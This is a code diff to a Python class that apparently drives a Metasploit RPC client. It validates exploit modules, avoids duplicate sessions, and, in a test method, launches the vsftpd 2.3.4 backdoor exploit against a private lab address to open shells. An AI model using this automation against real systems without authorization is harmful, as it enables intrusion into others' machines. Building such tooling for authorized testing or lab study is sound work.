@@ -16,10 +16,28 @@ class Console:
         self.exploit = None
         self.shells = {}
 
+    def search_module(self, module_name):
+        logging.debug(f"searching for module -> ")
+        return self.client.modules.search(module_name)
+
+    def is_valid_module(self, module_name):
+        modules_data = self.search_module(module_name)
+        for module in modules_data:
+            if module_name == module['fullname']: 
+                logging.debug(f"valid module selected -> {module['fullname']}")
+                return True
+        logging.error(f"invalid module selected -> {module_name}")
+        return False
+
     def set_payload(self, payload_path):
+        if not self.is_valid_module(payload_path):
+            logging.error("payload has not been set")
+            return        
         self.exploit = self.client.modules.use('exploit', payload_path)
         
+        
     def set_arguments(self, arguments):
+        if self.exploit is None: return
         for argument in arguments.keys():
             self.exploit[argument] = arguments[argument]
 
@@ -29,21 +47,24 @@ class Console:
                 return id
         return None
 
+    def is_exploited(self, target):
+        sessions = self.client.sessions.list
+        for session_id in sessions:
+            if sessions[session_id]["target_host"] == target:
+                return (True, session_id)
+        return (False, session_id)
+
     async def run_payload(self, shell_path, ip):
-        old_len = len(self.client.sessions.list)
+        if self.exploit is None: return
+        is_exploited, session_id = self.is_exploited(ip)
+        if is_exploited:
+            logging.warning(f"target {ip} already has a session; session_id -> {session_id} ")
+            return session_id
+
         exploit_result = self.exploit.execute(payload=shell_path)
         exploit_result["ip"] = ip
         logging.debug("job_id -> " + str(exploit_result["job_id"]))
         logging.debug(exploit_result)
-        while True:
-            logging.debug(self.client.sessions.list)
-            await asyncio.sleep(1)
-            new_len = len(self.client.sessions.list)
-            logging.debug(str(old_len)+"; "+ str(new_len))
-            if new_len - 1 == old_len:
-                logging.debug("session received")
-                logging.debug(self.client.sessions.list)
-                break
 
         session_id = self.get_session_id(ip)
 
@@ -90,7 +111,7 @@ class Console:
     async def test(self):
         logging.debug("before: "+str(self.client.sessions.list))
         #exploit = self.client.modules.use('exploit', "unix/ftp/vsftpd_234_backdoor")
-        self.set_payload('unix/ftp/vsftpd_234_backdoor')
+        self.set_payload('exploit/unix/ftp/vsftpd_234_backdoor')
         # self.set_payload('exploit/linux/postgres/postgres_payload')
         self.set_arguments({
             "RHOSTS":"192.168.17.130"
